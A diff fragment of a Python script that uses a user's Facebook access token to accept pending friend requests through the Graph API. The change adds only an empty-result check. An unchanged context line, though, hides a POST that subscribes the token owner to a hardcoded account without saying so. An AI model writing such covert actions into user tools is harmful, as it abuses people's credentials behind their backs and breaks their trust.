@@ -17,6 +17,8 @@ try:
 	r = requests.get('https://graph.facebook.com/me/friendrequests?limit=100&access_token=' + toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 	res = json.loads(r.text)
 
+	if '[]' in str(res['data']):
+		exit("[!] no friends requests")
 	for i in res['data']:
 		req = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(i['from']['id'] , toket))
 		a = json.loads(req.text)
